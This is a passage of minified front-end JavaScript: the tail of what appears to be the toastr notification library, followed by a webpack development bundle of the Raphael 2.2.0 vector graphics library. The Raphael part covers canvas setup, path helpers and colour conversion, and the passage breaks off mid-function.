&& (h.addClass(s.closeClass).attr("role", "button"), l.prepend(h)), s.progressBar && (u.addClass(s.progressClass), l.prepend(u)), s.rtl && l.addClass("rtl"), s.newestOnTop ? B.prepend(l) : B.append(l), function () { var t = ""; switch (e.iconClass) { case "toast-success": case "toast-info": t = "polite"; break; default: t = "assertive" }l.attr("aria-live", t) }(), l.hide(), l[s.showMethod]({ duration: s.showDuration, easing: s.showEasing, complete: s.onShown }), 0 < s.timeOut && (g = setTimeout(i, s.timeOut), d.maxHideTime = parseFloat(s.timeOut), d.hideEta = (new Date).getTime() + d.maxHideTime, s.progressBar && (d.intervalId = setInterval(a, 10))), s.closeOnHover && l.hover(o, t), !s.onclick && s.tapToDismiss && l.click(i), s.closeButton && h && h.click(function (t) { t.stopPropagation ? t.stopPropagation() : void 0 !== t.cancelBubble && !0 !== t.cancelBubble && (t.cancelBubble = !0), s.onCloseClick && s.onCloseClick(t), i(!0) }), s.onclick && l.click(function (t) { s.onclick(t), i() }), m(C), s.debug && console && console.log(C), l } } function f() { return A.extend({}, { tapToDismiss: !0, toastClass: "toast", containerId: "toast-container", debug: !1, showMethod: "fadeIn", showDuration: 300, showEasing: "swing", onShown: void 0, hideMethod: "fadeOut", hideDuration: 1e3, hideEasing: "swing", onHidden: void 0, closeMethod: !1, closeDuration: !1, closeEasing: !1, closeOnHover: !0, extendedTimeOut: 1e3, iconClasses: { error: "toast-error", info: "toast-info", success: "toast-success", warning: "toast-warning" }, iconClass: "toast-info", positionClass: "toast-top-right", timeOut: 5e3, titleClass: "toast-title", messageClass: "toast-message", escapeHtml: !1, target: "body", closeHtml: '<button type="button">&times;</button>', closeClass: "toast-close-button", newestOnTop: !0, preventDuplicates: !1, progressBar: !1, progressClass: "toast-progress", rtl: !1 }, t.options) } function b(t) { B = B || p(), t.is(":visible") || (t.remove(), t = null, 0 === B.children().length && (B.remove(), y = void 0)) } var B, e, y, v, a, s, r, g, t }), function (t, e) { "object" == typeof exports && "object" == typeof module ? module.exports = e() : "function" == typeof define && define.amd ? define([], e) : "object" == typeof exports ? exports.Raphael = e() : t.Raphael = e() }(window, function () { return HUd = { "./dev/raphael.amd.js": function (module, exports, __webpack_require__) { eval('var __WEBPACK_AMD_DEFINE_ARRAY__, __WEBPACK_AMD_DEFINE_RESULT__;!(__WEBPACK_AMD_DEFINE_ARRAY__ = [__webpack_require__(/*! ./raphael.core */ "./dev/raphael.core.js"), __webpack_require__(/*! ./raphael.svg */ "./dev/raphael.svg.js"), __webpack_require__(/*! ./raphael.vml */ "./dev/raphael.vml.js")], __WEBPACK_AMD_DEFINE_RESULT__ = (function(R) {\n\n    return R;\n\n}).apply(exports, __WEBPACK_AMD_DEFINE_ARRAY__),\n\t\t\t\t__WEBPACK_AMD_DEFINE_RESULT__ !== undefined && (module.exports = __WEBPACK_AMD_DEFINE_RESULT__));//# sourceURL=[module]\n//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJmaWxlIjoiLi9kZXYvcmFwaGFlbC5hbWQuanMuanMiLCJzb3VyY2VzIjpbIndlYnBhY2s6Ly9SYXBoYWVsLy4vZGV2L3JhcGhhZWwuYW1kLmpzPzM1NjQiXSwic291cmNlc0NvbnRlbnQiOlsiZGVmaW5lKFtcIi4vcmFwaGFlbC5jb3JlXCIsIFwiLi9yYXBoYWVsLnN2Z1wiLCBcIi4vcmFwaGFlbC52bWxcIl0sIGZ1bmN0aW9uKFIpIHtcblxuICAgIHJldHVybiBSO1xuXG59KTsiXSwibWFwcGluZ3MiOiJBQUFBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQSIsInNvdXJjZVJvb3QiOiIifQ==\n//# sourceURL=webpack-internal:///./dev/raphael.amd.js\n') }, "./dev/raphael.core.js": function (module, exports, __webpack_require__) { eval('var __WEBPACK_AMD_DEFINE_ARRAY__, __WEBPACK_AMD_DEFINE_RESULT__;!(__WEBPACK_AMD_DEFINE_ARRAY__ = [__webpack_require__(/*! eve */ "./node_modules/eve-raphael/eve.js")], __WEBPACK_AMD_DEFINE_RESULT__ = (function(eve) {\n\n    /*\\\n     * Raphael\n     [ method ]\n     **\n     * Creates a canvas object on which to draw.\n     * You must do this first, as all future calls to drawing methods\n     * from this instance will be bound to this canvas.\n     > Parameters\n     **\n     - container (HTMLElement|string) DOM element or its ID which is going to be a parent for drawing surface\n     - width (number)\n     - height (number)\n     - callback (function) #optional callback function which is going to be executed in the context of newly created paper\n     * or\n     - x (number)\n     - y (number)\n     - width (number)\n     - height (number)\n     - callback (function) #optional callback function which is going to be executed in the context of newly created paper\n     * or\n     - all (array) (first 3 or 4 elements in the array are equal to [containerID, width, height] or [x, y, width, height]. The rest are element descriptions in format {type: type, <attributes>}). See @Paper.add.\n     - callback (function) #optional callback function which is going to be executed in the context of newly created paper\n     * or\n     - onReadyCallback (function) function that is going to be called on DOM ready event. You can also subscribe to this event via Eveâs âDOMLoadâ event. In this case method returns `undefined`.\n     = (object) @Paper\n     > Usage\n     | // Each of the following examples create a canvas\n     | // that is 320px wide by 200px high.\n     | // Canvas is created at the viewportâs 10,50 coordinate.\n     | var paper = Raphael(10, 50, 320, 200);\n     | // Canvas is created at the top left corner of the #notepad element\n     | // (or its top right corner in dir="rtl" elements)\n     | var paper = Raphael(document.getElementById("notepad"), 320, 200);\n     | // Same as above\n     | var paper = Raphael("notepad", 320, 200);\n     | // Image dump\n     | var set = Raphael(["notepad", 320, 200, {\n     |     type: "rect",\n     |     x: 10,\n     |     y: 10,\n     |     width: 25,\n     |     height: 25,\n     |     stroke: "#f00"\n     | }, {\n     |     type: "text",\n     |     x: 30,\n     |     y: 40,\n     |     text: "Dump"\n     | }]);\n    \\*/\n    function R(first) {\n        if (R.is(first, "function")) {\n            return loaded ? first() : eve.on("raphael.DOMload", first);\n        } else if (R.is(first, array)) {\n            return R._engine.create[apply](R, first.splice(0, 3 + R.is(first[0], nu))).add(first);\n        } else {\n            var args = Array.prototype.slice.call(arguments, 0);\n            if (R.is(args[args.length - 1], "function")) {\n                var f = args.pop();\n                return loaded ? f.call(R._engine.create[apply](R, args)) : eve.on("raphael.DOMload", function () {\n                    f.call(R._engine.create[apply](R, args));\n                });\n            } else {\n                return R._engine.create[apply](R, arguments);\n            }\n        }\n    }\n    R.version = "2.2.0";\n    R.eve = eve;\n    var loaded,\n        separator = /[, ]+/,\n        elements = {circle: 1, rect: 1, path: 1, ellipse: 1, text: 1, image: 1},\n        formatrg = /\\{(\\d+)\\}/g,\n        proto = "prototype",\n        has = "hasOwnProperty",\n        g = {\n            doc: document,\n            win: window\n        },\n        oldRaphael = {\n            was: Object.prototype[has].call(g.win, "Raphael"),\n            is: g.win.Raphael\n        },\n        Paper = function () {\n            /*\\\n             * Paper.ca\n             [ property (object) ]\n             **\n             * Shortcut for @Paper.customAttributes\n            \\*/\n            /*\\\n             * Paper.customAttributes\n             [ property (object) ]\n             **\n             * If you have a set of attributes that you would like to represent\n             * as a function of some number you can do it easily with custom attributes:\n             > Usage\n             | paper.customAttributes.hue = function (num) {\n             |     num = num % 1;\n             |     return {fill: "hsb(" + num + ", 0.75, 1)"};\n             | };\n             | // Custom attribute âhueâ will change fill\n             | // to be given hue with fixed saturation and brightness.\n             | // Now you can use it like this:\n             | var c = paper.circle(10, 10, 10).attr({hue: .45});\n             | // or even like this:\n             | c.animate({hue: 1}, 1e3);\n             |\n             | // You could also create custom attribute\n             | // with multiple parameters:\n             | paper.customAttributes.hsb = function (h, s, b) {\n             |     return {fill: "hsb(" + [h, s, b].join(",") + ")"};\n             | };\n             | c.attr({hsb: "0.5 .8 1"});\n             | c.animate({hsb: [1, 0, 0.5]}, 1e3);\n            \\*/\n            this.ca = this.customAttributes = {};\n        },\n        paperproto,\n        appendChild = "appendChild",\n        apply = "apply",\n        concat = "concat",\n        //taken from Modernizr touch test: https://github.com/Modernizr/Modernizr/blob/master/feature-detects/touchevents.js#L40\n        supportsTouch = (\'ontouchstart\' in window) || window.TouchEvent || window.DocumentTouch && document instanceof DocumentTouch,\n        E = "",\n        S = " ",\n        Str = String,\n        split = "split",\n        events = "click dblclick mousedown mousemove mouseout mouseover mouseup touchstart touchmove touchend touchcancel"[split](S),\n        touchMap = {\n            mousedown: "touchstart",\n            mousemove: "touchmove",\n            mouseup: "touchend"\n        },\n        lowerCase = Str.prototype.toLowerCase,\n        math = Math,\n        mmax = math.max,\n        mmin = math.min,\n        abs = math.abs,\n        pow = math.pow,\n        PI = math.PI,\n        nu = "number",\n        string = "string",\n        array = "array",\n        toString = "toString",\n        fillString = "fill",\n        objectToString = Object.prototype.toString,\n        paper = {},\n        push = "push",\n        ISURL = R._ISURL = /^url\\([\'"]?(.+?)[\'"]?\\)$/i,\n        colourRegExp = /^\\s*((#[a-f\\d]{6})|(#[a-f\\d]{3})|rgba?\\(\\s*([\\d\\.]+%?\\s*,\\s*[\\d\\.]+%?\\s*,\\s*[\\d\\.]+%?(?:\\s*,\\s*[\\d\\.]+%?)?)\\s*\\)|hsba?\\(\\s*([\\d\\.]+(?:deg|\\xb0|%)?\\s*,\\s*[\\d\\.]+%?\\s*,\\s*[\\d\\.]+(?:%?\\s*,\\s*[\\d\\.]+)?)%?\\s*\\)|hsla?\\(\\s*([\\d\\.]+(?:deg|\\xb0|%)?\\s*,\\s*[\\d\\.]+%?\\s*,\\s*[\\d\\.]+(?:%?\\s*,\\s*[\\d\\.]+)?)%?\\s*\\))\\s*$/i,\n        isnan = {"NaN": 1, "Infinity": 1, "-Infinity": 1},\n        bezierrg = /^(?:cubic-)?bezier\\(([^,]+),([^,]+),([^,]+),([^\\)]+)\\)/,\n        round = math.round,\n        setAttribute = "setAttribute",\n        toFloat = parseFloat,\n        toInt = parseInt,\n        upperCase = Str.prototype.toUpperCase,\n        availableAttrs = R._availableAttrs = {\n            "arrow-end": "none",\n            "arrow-start": "none",\n            blur: 0,\n            "clip-rect": "0 0 1e9 1e9",\n            cursor: "default",\n            cx: 0,\n            cy: 0,\n            fill: "#fff",\n            "fill-opacity": 1,\n            font: \'10px "Arial"\',\n            "font-family": \'"Arial"\',\n            "font-size": "10",\n            "font-style": "normal",\n            "font-weight": 400,\n            gradient: 0,\n            height: 0,\n            href: "https://raphaeljs.com/",\n            "letter-spacing": 0,\n            opacity: 1,\n            path: "M0,0",\n            r: 0,\n            rx: 0,\n            ry: 0,\n            src: "",\n            stroke: "#000",\n            "stroke-dasharray": "",\n            "stroke-linecap": "butt",\n            "stroke-linejoin": "butt",\n            "stroke-miterlimit": 0,\n            "stroke-opacity": 1,\n            "stroke-width": 1,\n            target: "_blank",\n            "text-anchor": "middle",\n            title: "Raphael",\n            transform: "",\n            width: 0,\n            x: 0,\n            y: 0,\n            "class": ""\n        },\n        availableAnimAttrs = R._availableAnimAttrs = {\n            blur: nu,\n            "clip-rect": "csv",\n            cx: nu,\n            cy: nu,\n            fill: "colour",\n            "fill-opacity": nu,\n            "font-size": nu,\n            height: nu,\n            opacity: nu,\n            path: "path",\n            r: nu,\n            rx: nu,\n            ry: nu,\n            stroke: "colour",\n            "stroke-opacity": nu,\n            "stroke-width": nu,\n            transform: "transform",\n            width: nu,\n            x: nu,\n            y: nu\n        },\n        whitespace = /[\\x09\\x0a\\x0b\\x0c\\x0d\\x20\\xa0\\u1680\\u180e\\u2000\\u2001\\u2002\\u2003\\u2004\\u2005\\u2006\\u2007\\u2008\\u2009\\u200a\\u202f\\u205f\\u3000\\u2028\\u2029]/g,\n        commaSpaces = /[\\x09\\x0a\\x0b\\x0c\\x0d\\x20\\xa0\\u1680\\u180e\\u2000\\u2001\\u2002\\u2003\\u2004\\u2005\\u2006\\u2007\\u2008\\u2009\\u200a\\u202f\\u205f\\u3000\\u2028\\u2029]*,[\\x09\\x0a\\x0b\\x0c\\x0d\\x20\\xa0\\u1680\\u180e\\u2000\\u2001\\u2002\\u2003\\u2004\\u2005\\u2006\\u2007\\u2008\\u2009\\u200a\\u202f\\u205f\\u3000\\u2028\\u2029]*/,\n        hsrg = {hs: 1, rg: 1},\n        p2s = /,?([achlmqrstvxz]),?/gi,\n        pathCommand = /([achlmrqstvz])[\\x09\\x0a\\x0b\\x0c\\x0d\\x20\\xa0\\u1680\\u180e\\u2000\\u2001\\u2002\\u2003\\u2004\\u2005\\u2006\\u2007\\u2008\\u2009\\u200a\\u202f\\u205f\\u3000\\u2028\\u2029,]*((-?\\d*\\.?\\d*(?:e[\\-+]?\\d+)?[\\x09\\x0a\\x0b\\x0c\\x0d\\x20\\xa0\\u1680\\u180e\\u2000\\u2001\\u2002\\u2003\\u2004\\u2005\\u2006\\u2007\\u2008\\u2009\\u200a\\u202f\\u205f\\u3000\\u2028\\u2029]*,?[\\x09\\x0a\\x0b\\x0c\\x0d\\x20\\xa0\\u1680\\u180e\\u2000\\u2001\\u2002\\u2003\\u2004\\u2005\\u2006\\u2007\\u2008\\u2009\\u200a\\u202f\\u205f\\u3000\\u2028\\u2029]*)+)/ig,\n        tCommand = /([rstm])[\\x09\\x0a\\x0b\\x0c\\x0d\\x20\\xa0\\u1680\\u180e\\u2000\\u2001\\u2002\\u2003\\u2004\\u2005\\u2006\\u2007\\u2008\\u2009\\u200a\\u202f\\u205f\\u3000\\u2028\\u2029,]*((-?\\d*\\.?\\d*(?:e[\\-+]?\\d+)?[\\x09\\x0a\\x0b\\x0c\\x0d\\x20\\xa0\\u1680\\u180e\\u2000\\u2001\\u2002\\u2003\\u2004\\u2005\\u2006\\u2007\\u2008\\u2009\\u200a\\u202f\\u205f\\u3000\\u2028\\u2029]*,?[\\x09\\x0a\\x0b\\x0c\\x0d\\x20\\xa0\\u1680\\u180e\\u2000\\u2001\\u2002\\u2003\\u2004\\u2005\\u2006\\u2007\\u2008\\u2009\\u200a\\u202f\\u205f\\u3000\\u2028\\u2029]*)+)/ig,\n        pathValues = /(-?\\d*\\.?\\d*(?:e[\\-+]?\\d+)?)[\\x09\\x0a\\x0b\\x0c\\x0d\\x20\\xa0\\u1680\\u180e\\u2000\\u2001\\u2002\\u2003\\u2004\\u2005\\u2006\\u2007\\u2008\\u2009\\u200a\\u202f\\u205f\\u3000\\u2028\\u2029]*,?[\\x09\\x0a\\x0b\\x0c\\x0d\\x20\\xa0\\u1680\\u180e\\u2000\\u2001\\u2002\\u2003\\u2004\\u2005\\u2006\\u2007\\u2008\\u2009\\u200a\\u202f\\u205f\\u3000\\u2028\\u2029]*/ig,\n        radial_gradient = R._radial_gradient = /^r(?:\\(([^,]+?)[\\x09\\x0a\\x0b\\x0c\\x0d\\x20\\xa0\\u1680\\u180e\\u2000\\u2001\\u2002\\u2003\\u2004\\u2005\\u2006\\u2007\\u2008\\u2009\\u200a\\u202f\\u205f\\u3000\\u2028\\u2029]*,[\\x09\\x0a\\x0b\\x0c\\x0d\\x20\\xa0\\u1680\\u180e\\u2000\\u2001\\u2002\\u2003\\u2004\\u2005\\u2006\\u2007\\u2008\\u2009\\u200a\\u202f\\u205f\\u3000\\u2028\\u2029]*([^\\)]+?)\\))?/,\n        eldata = {},\n        sortByKey = function (a, b) {\n            return a.key - b.key;\n        },\n        sortByNumber = function (a, b) {\n            return toFloat(a) - toFloat(b);\n        },\n        fun = function () {},\n        pipe = function (x) {\n            return x;\n        },\n        rectPath = R._rectPath = function (x, y, w, h, r) {\n            if (r) {\n                return [["M", x + r, y], ["l", w - r * 2, 0], ["a", r, r, 0, 0, 1, r, r], ["l", 0, h - r * 2], ["a", r, r, 0, 0, 1, -r, r], ["l", r * 2 - w, 0], ["a", r, r, 0, 0, 1, -r, -r], ["l", 0, r * 2 - h], ["a", r, r, 0, 0, 1, r, -r], ["z"]];\n            }\n            return [["M", x, y], ["l", w, 0], ["l", 0, h], ["l", -w, 0], ["z"]];\n        },\n        ellipsePath = function (x, y, rx, ry) {\n            if (ry == null) {\n                ry = rx;\n            }\n            return [["M", x, y], ["m", 0, -ry], ["a", rx, ry, 0, 1, 1, 0, 2 * ry], ["a", rx, ry, 0, 1, 1, 0, -2 * ry], ["z"]];\n        },\n        getPath = R._getPath = {\n            path: function (el) {\n                return el.attr("path");\n            },\n            circle: function (el) {\n                var a = el.attrs;\n                return ellipsePath(a.cx, a.cy, a.r);\n            },\n            ellipse: function (el) {\n                var a = el.attrs;\n                return ellipsePath(a.cx, a.cy, a.rx, a.ry);\n            },\n            rect: function (el) {\n                var a = el.attrs;\n                return rectPath(a.x, a.y, a.width, a.height, a.r);\n            },\n            image: function (el) {\n                var a = el.attrs;\n                return rectPath(a.x, a.y, a.width, a.height);\n            },\n            text: function (el) {\n                var bbox = el._getBBox();\n                return rectPath(bbox.x, bbox.y, bbox.width, bbox.height);\n            },\n            set : function(el) {\n                var bbox = el._getBBox();\n                return rectPath(bbox.x, bbox.y, bbox.width, bbox.height);\n            }\n        },\n        /*\\\n         * Raphael.mapPath\n         [ method ]\n         **\n         * Transform the path string with given matrix.\n         > Parameters\n         - path (string) path string\n         - matrix (object) see @Matrix\n         = (string) transformed path string\n        \\*/\n        mapPath = R.mapPath = function (path, matrix) {\n            if (!matrix) {\n                return path;\n            }\n            var x, y, i, j, ii, jj, pathi;\n            path = path2curve(path);\n            for (i = 0, ii = path.length; i < ii; i++) {\n                pathi = path[i];\n                for (j = 1, jj = pathi.length; j < jj; j += 2) {\n                    x = matrix.x(pathi[j], pathi[j + 1]);\n                    y = matrix.y(pathi[j], pathi[j + 1]);\n                    pathi[j] = x;\n                    pathi[j + 1] = y;\n                }\n            }\n            return path;\n        };\n\n    R._g = g;\n    /*\\\n     * Raphael.type\n     [ property (string) ]\n     **\n     * Can be âSVGâ, âVMLâ or empty, depending on browser support.\n    \\*/\n    R.type = (g.win.SVGAngle || g.doc.implementation.hasFeature("https://www.w3.org/TR/SVG11/feature#BasicStructure", "1.1") ? "SVG" : "VML");\n    if (R.type == "VML") {\n        var d = g.doc.createElement("div"),\n            b;\n        d.innerHTML = \'<v:shape adj="1"/>\';\n        b = d.firstChild;\n        b.style.behavior = "url(#default#VML)";\n        if (!(b && typeof b.adj == "object")) {\n            return (R.type = E);\n        }\n        d = null;\n    }\n    /*\\\n     * Raphael.svg\n     [ property (boolean) ]\n     **\n     * `true` if browser supports SVG.\n    \\*/\n    /*\\\n     * Raphael.vml\n     [ property (boolean) ]\n     **\n     * `true` if browser supports VML.\n    \\*/\n    R.svg = !(R.vml = R.type == "VML");\n    R._Paper = Paper;\n    /*\\\n     * Raphael.fn\n     [ property (object) ]\n     **\n     * You can add your own method to the canvas. For example if you want to draw a pie chart,\n     * you can create your own pie chart function and ship it as a RaphaÃ«l plugin. To do this\n     * you need to extend the `Raphael.fn` object. You should modify the `fn` object before a\n     * RaphaÃ«l instance is created, otherwise it will take no effect. Please note that the\n     * ability for namespaced plugins was removed in Raphael 2.0. It is up to the plugin to\n     * ensure any namespacing ensures proper context.\n     > Usage\n     | Raphael.fn.arrow = function (x1, y1, x2, y2, size) {\n     |     return this.path( ... );\n     | };\n     | // or create namespace\n     | Raphael.fn.mystuff = {\n     |     arrow: function () {â¦},\n     |     star: function () {â¦},\n     |     // etcâ¦\n     | };\n     | var paper = Raphael(10, 10, 630, 480);\n     | // then use it\n     | paper.arrow(10, 10, 30, 30, 5).attr({fill: "#f00"});\n     | paper.mystuff.arrow();\n     | paper.mystuff.star();\n    \\*/\n    R.fn = paperproto = Paper.prototype = R.prototype;\n    R._id = 0;\n    /*\\\n     * Raphael.is\n     [ method ]\n     **\n     * Handful of replacements for `typeof` operator.\n     > Parameters\n     - o (â¦) any object or primitive\n     - type (string) name of the type, i.e. âstringâ, âfunctionâ, ânumberâ, etc.\n     = (boolean) is given value is of given type\n    \\*/\n    R.is = function (o, type) {\n        type = lowerCase.call(type);\n        if (type == "finite") {\n            return !isnan[has](+o);\n        }\n        if (type == "array") {\n            return o instanceof Array;\n        }\n        return  (type == "null" && o === null) ||\n                (type == typeof o && o !== null) ||\n                (type == "object" && o === Object(o)) ||\n                (type == "array" && Array.isArray && Array.isArray(o)) ||\n                objectToString.call(o).slice(8, -1).toLowerCase() == type;\n    };\n\n    function clone(obj) {\n        if (typeof obj == "function" || Object(obj) !== obj) {\n            return obj;\n        }\n        var res = new obj.constructor;\n        for (var key in obj) if (obj[has](key)) {\n            res[key] = clone(obj[key]);\n        }\n        return res;\n    }\n\n    /*\\\n     * Raphael.angle\n     [ method ]\n     **\n     * Returns angle between two or three points\n     > Parameters\n     - x1 (number) x coord of first point\n     - y1 (number) y coord of first point\n     - x2 (number) x coord of second point\n     - y2 (number) y coord of second point\n     - x3 (number) #optional x coord of third point\n     - y3 (number) #optional y coord of third point\n     = (number) angle in degrees.\n    \\*/\n    R.angle = function (x1, y1, x2, y2, x3, y3) {\n        if (x3 == null) {\n            var x = x1 - x2,\n                y = y1 - y2;\n            if (!x && !y) {\n                return 0;\n            }\n            return (180 + math.atan2(-y, -x) * 180 / PI + 360) % 360;\n        } else {\n            return R.angle(x1, y1, x3, y3) - R.angle(x2, y2, x3, y3);\n        }\n    };\n    /*\\\n     * Raphael.rad\n     [ method ]\n     **\n     * Transform angle to radians\n     > Parameters\n     - deg (number) angle in degrees\n     = (number) angle in radians.\n    \\*/\n    R.rad = function (deg) {\n        return deg % 360 * PI / 180;\n    };\n    /*\\\n     * Raphael.deg\n     [ method ]\n     **\n     * Transform angle to degrees\n     > Parameters\n     - rad (number) angle in radians\n     = (number) angle in degrees.\n    \\*/\n    R.deg = function (rad) {\n        return Math.round ((rad * 180 / PI% 360)* 1000) / 1000;\n    };\n    /*\\\n     * Raphael.snapTo\n     [ method ]\n     **\n     * Snaps given value to given grid.\n     > Parameters\n     - values (array|number) given array of values or step of the grid\n     - value (number) value to adjust\n     - tolerance (number) #optional tolerance for snapping. Default is `10`.\n     = (number) adjusted value.\n    \\*/\n    R.snapTo = function (values, value, tolerance) {\n        tolerance = R.is(tolerance, "finite") ? tolerance : 10;\n        if (R.is(values, array)) {\n            var i = values.length;\n            while (i--) if (abs(values[i] - value) <= tolerance) {\n                return values[i];\n            }\n        } else {\n            values = +values;\n            var rem = value % values;\n            if (rem < tolerance) {\n                return value - rem;\n            }\n            if (rem > values - tolerance) {\n                return value - rem + values;\n            }\n        }\n        return value;\n    };\n\n    /*\\\n     * Raphael.createUUID\n     [ method ]\n     **\n     * Returns RFC4122, version 4 ID\n    \\*/\n    var createUUID = R.createUUID = (function (uuidRegEx, uuidReplacer) {\n        return function () {\n            return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(uuidRegEx, uuidReplacer).toUpperCase();\n        };\n    })(/[xy]/g, function (c) {\n        var r = math.random() * 16 | 0,\n            v = c == "x" ? r : (r & 3 | 8);\n        return v.toString(16);\n    });\n\n    /*\\\n     * Raphael.setWindow\n     [ method ]\n     **\n     * Used when you need to draw in `&lt;iframe>`. Switched window to the iframe one.\n     > Parameters\n     - newwin (window) new window object\n    \\*/\n    R.setWindow = function (newwin) {\n        eve("raphael.setWindow", R, g.win, newwin);\n        g.win = newwin;\n        g.doc = g.win.document;\n        if (R._engine.initWin) {\n            R._engine.initWin(g.win);\n        }\n    };\n    var toHex = function (color) {\n        if (R.vml) {\n            // https://dean.edwards.name/weblog/2009/10/convert-any-colour-value-to-hex-in-msie/\n            var trim = /^\\s+|\\s+$/g;\n            var bod;\n            try {\n                var docum = new ActiveXObject("htmlfile");\n                docum.write("<body>");\n                docum.close();\n                bod = docum.body;\n            } catch(e) {\n                bod = createPopup().document.body;\n            }\n            var range = bod.createTextRange();\n            toHex = cacher(function (color) {\n                try {\n                    bod.style.color = Str(color).replace(trim, E);\n                    var value = range.queryCommandValue("ForeColor");\n                    value = ((value & 255) << 16) | (value & 65280) | ((value & 16711680) >>> 16);\n                    return "#" + ("000000" + value.toString(16)).slice(-6);\n                } catch(e) {\n                    return "none";\n                }\n            });\n        } else {\n            var i = g.doc.createElement("i");\n            i.title = "Rapha\\xebl Colour Picker";\n            i.style.display = "none";\n            g.doc.body.appendChild(i);\n            toHex = cacher(function (color) {\n                i.style.color = color;\n                return g.doc.defaultView.getComputedStyle(i, E).getPropertyValue("color");\n            });\n        }\n        return toHex(color);\n    },\n    hsbtoString = function () {\n        return "hsb(" + [this.h, this.s, this.b] + ")";\n    },\n    hsltoString = function () {\n        return "hsl(" + [this.h, this.s, this.l] + ")";\n    },\n    rgbtoString = function () {\n        return this.hex;\n    },\n    prepareRGB = function (r, g, b) {\n        if (g == null && R.is(r, "object") && "r" in r && "g" in r && "b" in r) {\n            b = r.b;\n            g = r.g;\n            r = r.r;\n        }\n        if (g == null && R.is(r, string)) {\n            var clr = R.getRGB(r);\n            r = clr.r;\n            g = clr.g;\n            b = clr.b;\n        }\n        if (r > 1 || g > 1 || b > 1) {\n            r /= 255;\n            g /= 255;\n            b /= 255;\n        }\n\n        return [r, g, b];\n    },\n    packageRGB = function (r, g, b, o) {\n        r *= 255;\n        g *= 255;\n        b *= 255;\n        var rgb = {\n            r: r,\n            g: g,\n            b: b,\n            hex: R.rgb(r, g, b),\n            toString: rgbtoString\n        };\n        R.is(o, "finite") && (rgb.opacity = o);\n        return rgb;\n    };\n\n    /*\\\n     * Raphael.color\n     [ method ]\n     **\n     * Parses the color string and returns object with all values for the given color.\n     > Parameters\n     - clr (string) color string in one of the supported formats (see @Raphael.getRGB)\n     = (object) Combined RGB & HSB object in format:\n     o {\n     o     r (number) red,\n     o     g (number) green,\n     o     b (number) blue,\n     o     hex (string) color in HTML/CSS format: #â¢â¢â¢â¢â¢â¢,\n     o     error (boolean) `true` if string canât be parsed,\n     o     h (number) hue,\n     o     s (number) saturation,\n     o     v (number) value (brightness),\n     o     l (number) lightness\n     o }\n    \\*/\n    R.color = function (clr) {\n        var rgb;\n        if (R.is(clr, "object") && "h" in clr && "s" in clr && "b" in clr) {\n            rgb = R.hsb2rgb(clr);\n            clr.r = rgb.r;\n            clr.g = rgb.g;\n            clr.b = rgb.b;\n            clr.hex = rgb.hex;\n        } else if (R.is(clr, "object") && "h" in clr && "s" in clr && "l" in clr) {\n            rgb = R.hsl2rgb(clr);\n            clr.r = rgb.r;\n            clr.g = rgb.g;\n            clr.b = rgb.b;\n            clr.hex = rgb.hex;\n        } else {\n            if (R.is(clr, "string")) {\n                clr = R.getRGB(clr);\n            }\n            if (R.is(clr, "object") && "r" in clr && "g" in clr && "b" in clr) {\n                rgb = R.rgb2hsl(clr);\n                clr.h = rgb.h;\n                clr.s = rgb.s;\n                clr.l = rgb.l;\n                rgb = R.rgb2hsb(clr);\n                clr.v = rgb.b;\n            } else {\n                clr = {hex: "none"};\n                clr.r = clr.g = clr.b = clr.h = clr.s = clr.v = clr.l = -1;\n            }\n        }\n        clr.toString = rgbtoString;\n        return clr;\n    };\n    /*\\\n     * Raphael.hsb2rgb\n     [ method ]\n     **\n     * Converts HSB values to RGB object.\n     > Parameters\n     - h (number) hue\n     - s (number) saturation\n     - v (number) value or brightness\n     = (object) RGB object in format:\n     o {\n     o     r (number) red,\n     o     g (number) green,\n     o     b (number) blue,\n     o     hex (string) color in HTML/CSS format: #â¢â¢â¢â¢â¢â¢\n     o }\n    \\*/\n    R.hsb2rgb = function (h, s, v, o) {\n        if (this.is(h, "object") && "h" in h && "s" in h && "b" in h) {\n            v = h.b;\n            s = h.s;\n            o = h.o;\n            h = h.h;\n        }\n        h *= 360;\n        var R, G, B, X, C;\n        h = (h % 360) / 60;\n        C = v * s;\n        X = C * (1 - abs(h % 2 - 1));\n        R = G = B = v - C;\n\n        h = ~~h;\n        R += [C, X, 0, 0, X, C][h];\n        G += [X, C, C, X, 0, 0][h];\n        B += [0, 0, X, C, C, X][h];\n        return packageRGB(R, G, B, o);\n    };\n    /*\\\n     * Raphael.hsl2rgb\n     [ method ]\n     **\n     * Converts HSL values to RGB object.\n     > Parameters\n     - h (number) hue\n     - s (number) saturation\n     - l (number) luminosity\n     = (object) RGB object in format:\n     o {\n     o     r (number) red,\n     o     g (number) green,\n     o     b (number) blue,\n     o     hex (string) color in HTML/CSS format: #â¢â¢â¢â¢â¢â¢\n     o }\n    \\*/\n    R.hsl2rgb = function (h, s, l, o) {\n        if (this.is(h, "object") && "h" in h && "s" in h && "l" in h) {\n            l = h.l;\n            s = h.s;\n            h = h.h;\n        }\n        if (h > 1 || s > 1 || l > 1) {\n            h /= 360;\n            s /= 100;\n            l /= 100;\n        }\n        h *= 360;\n        var R, G, B, X, C;\n        h = (h % 360) / 60;\n        C = 2 * s * (l < .5 ? l : 1 - l);\n        X = C * (1 - abs(h % 2 - 1));\n        R = G = B = l - C / 2;\n\n        h = ~~h;\n        R += [C, X, 0, 0, X, C][h];\n        G += [X, C, C, X, 0, 0][h];\n        B += [0, 0, X, C, C, X][h];\n        return packageRGB(R, G, B, o);\n    };\n    /*\\\n     * Raphael.rgb2hsb\n     [ method ]\n     **\n     * Converts RGB values to HSB object.\n     > Parameters\n     - r (number) red\n     - g (number) green\n     - b (number) blue\n     = (object) HSB object in format:\n     o {\n     o     h (number) hue\n     o     s (number) saturation\n     o     b (number) brightness\n     o }\n    \\*/\n    R.rgb2hsb = function (r, g, b) {\n        b = prepareRGB(r, g, b);\n        r = b[0];\n        g = b[1];\n        b = b[2];\n\n        var H, S, V, C;\n        V = mmax(r, g, b);\n        C = V - mmin(r, g, b);\n        H = (C == 0 ? null :\n             V == r ? (g - b) / C :\n             V == g ? (b - r) / C + 2 :\n                      (r - g) / C + 4\n            );\n        H = ((H + 360) % 6) * 60 / 360;\n        S = C == 0 ? 0 : C / V;\n        return {h: H, s: S, b: V, toString: hsbtoString};\n    };\n    /*\\\n     * Raphael.rgb2hsl\n     [ method ]\n     **\n     * Converts RGB values to HSL object.\n     > Parameters\n     - r (number) red\n     - g (number) green\n     